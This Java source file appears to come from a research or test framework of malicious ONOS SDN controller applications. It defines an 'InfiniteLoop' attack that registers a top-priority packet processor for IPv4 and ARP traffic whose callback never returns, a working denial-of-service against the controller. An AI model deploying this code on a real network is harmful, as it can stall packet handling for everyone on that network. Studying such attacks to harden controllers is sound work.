package org.onosproject.airs.attack;

import org.onlab.packet.Ethernet;
import org.onosproject.airs.AirsPacketProcessor;
import org.onosproject.core.ApplicationId;
import org.onosproject.net.flow.DefaultTrafficSelector;
import org.onosproject.net.flow.TrafficSelector;
import org.onosproject.net.packet.PacketContext;
import org.onosproject.net.packet.PacketPriority;
import org.onosproject.net.packet.PacketProcessor;
import org.onosproject.net.packet.PacketService;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class InfiniteLoop extends AbstractAttack {

  public static final String NAME = "InfiniteLoop";
  public static final String DESCR = "Infinite loops";

  private final Logger log = LoggerFactory.getLogger(getClass());

  private final ApplicationId appId;
  private final PacketService packetService;

  private AirsPacketProcessor packetProcessor;

  public InfiniteLoop(final ApplicationId appId, final PacketService packetService, final int countdownSec) {
    super(NAME, DESCR, countdownSec);

    this.appId = appId;
    this.packetService = packetService;

    packetProcessor = null;
  }

  @Override
  protected Logger getLog() {
    return log;
  }

  @Override
  protected void runAttack() {
    cleanupAfterAttack();

    // Install packet processor
    packetProcessor = new AirsPacketProcessor();
    packetService.addProcessor(packetProcessor, PacketProcessor.advisor(0));
    logInfo("installed packet processor with infinite loop in callback");
    final TrafficSelector.Builder selector = DefaultTrafficSelector.builder();
    selector.matchEthType(Ethernet.TYPE_IPV4);
    packetService.requestPackets(selector.build(), PacketPriority.REACTIVE, appId);
    selector.matchEthType(Ethernet.TYPE_ARP);
    packetService.requestPackets(selector.build(), PacketPriority.REACTIVE, appId);
    final LoopThread looper = new LoopThread();
    packetProcessor.setCallback(looper);
    try {
      looper.join();
    } catch (final InterruptedException e) {
      logException("interrupted while waiting for LoopThread to terminate", e);
    }
  }

  @Override
  protected void cleanupAfterAttack() {
    if (packetProcessor != null) {
      packetService.removeProcessor(packetProcessor);
    }
    packetProcessor = null;
  }

  private class LoopThread extends Thread implements AirsPacketProcessor.Callback {

    public LoopThread() {
      super();
    }

    @Override
    public void run() {
      while (true) {
        try {
          Thread.sleep(1000);
        } catch (final InterruptedException e) {
          logException("interrupted during LoopThread sleep", e);
        }
      }
    }

    @Override
    public void processPacket(final PacketContext ctx) {
      int i = 0;
      while (i < 32767) {
        i++;
        if (i == 32766) {
          i = 0;
        }
      }
    }
  }
}
